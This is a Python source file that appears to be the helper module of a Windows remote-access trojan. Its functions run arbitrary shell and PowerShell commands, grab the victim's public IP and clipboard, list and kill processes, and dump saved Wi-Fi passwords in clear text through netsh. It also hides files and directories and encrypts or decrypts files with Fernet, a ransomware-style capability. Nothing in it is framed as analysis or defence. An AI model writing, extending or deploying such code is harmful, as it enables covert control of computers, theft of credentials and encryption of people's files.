import sys, os, requests, pathlib
from cryptography.fernet import Fernet
import subprocess, re



tmp = os.environ['tmp']
tmp = pathlib.Path(tmp).resolve()

sspath = f"{tmp}\\ss1.png"
try:
    
    public_ip = requests.get('https://api.ipify.org').text
except Exception as e:
    public_ip = "Null"

def cd(location):
    content = os.chdir(location)
    return f"```{content}```"
def cmd(content):
    content = os.popen(content).read()
    if content=="":
        return "```No Output```"
    elif len(content) > 2048:
        f = open(f'{tmp}\\output.txt', 'w')
        sys.stdout=f
        print(content)
        sys.stdout.close()
        return f'{tmp}\\output.txt'
    else:
        return f"```{content}```"
def encrypt(file, key):
    
    f = open(file, 'rb')
    fernet = Fernet(key)
    original = f.read()
    encrypted = fernet.encrypt(original)
    f = open(file, 'wb')
    f.write(encrypted)
    f.close()
def decrypt(file, key):
    
    f = open(file, 'rb')
    fernet = Fernet(key)
    encrypted = f.read()
    decrypted = fernet.decrypt(encrypted)
    f = open(file, 'wb')
    f.write(decrypted)
    f.close()

def clipboard():
    text=os.popen(f"powershell -Command Get-Clipboard")
    return text

def tasklist(task):
    if task =="":
        x = os.popen(f"powershell -Command Get-Process")

        if len(x.read()) > 2048:
            x = os.popen(f"powershell -Command Get-Process")

            f = open(f'{tmp}\\output.txt', 'w')
            f.write(str(x.read()))
            f.close()
            return "File"
        else:
            x = os.popen(f"powershell -Command Get-Process")

            return x.read()
    else:
        x = os.popen(f"powershell -Command Get-Process -Name {task}")
        if len(x.read()) > 2048:
            x = os.popen(f"powershell -Command Get-Process -Name {task}")
            f = open(f'{tmp}\\output.txt', 'w')
            f.write(x.read())
            f.close()
            return "File"

        else:
            x = os.popen(f"powershell -Command Get-Process -Name {task}")
            return x.read()

def stoptask(task):
    try:
        x = os.popen(f"powershell -Command Stop-Process -Name {task}")
        return "Task Completed"
    except Exception as e:
        return e
def wifip():
    x = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True, encoding='utf-8')
    pattern = r"^\s*All User Profile\s*:\s*(.+?)\s*$"
    names = re.findall(pattern, x.stdout, re.MULTILINE)
    passes = {}
    for i in names:
        x = subprocess.run(
        ["netsh", "wlan", "show", "profile", f"name={i}", "key=clear"],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="ignore"
    )    
        try:
            for x in x.stdout.splitlines():
                if "Key" in x and ":" in x:
                    password = x.split(':')[1]
                    passes[i] = password
                else:
                    None

        except Exception as e:
            None
        
    return passes
    

def ps(command):
    x = os.popen(f"powershell -Command {command}")

    if len(x.read())>2048:
        x = os.popen(f"powershell -Command {command}")

        f = open(f"{tmp}\\output.txt", 'w')
        f.write(x.read())
        f.close()
        return "File"
    else:
        x = os.popen(f"powershell -Command {command}")
        return x.read()
    

def hide(type, file):     
    try:
        if type=='file':
            x = os.popen(f"attrib +h {file}")
            return "File hidden successfully"
        if type=='dir':
            x = os.popen(f"attrib +h /s /d {file}")
            return "Directory hidden successfully"
    except Exception as e:
        return e

def unhihde(type, file):
    try:
        if type=='file':
            x = os.popen(f"attrib ih {file}")
            return "Operation completed"
        if type=='dir':
            x = os.popen(f"attrib -h /s /d {file}")
            return "Operation completed"
    except Exception as e:
        return e
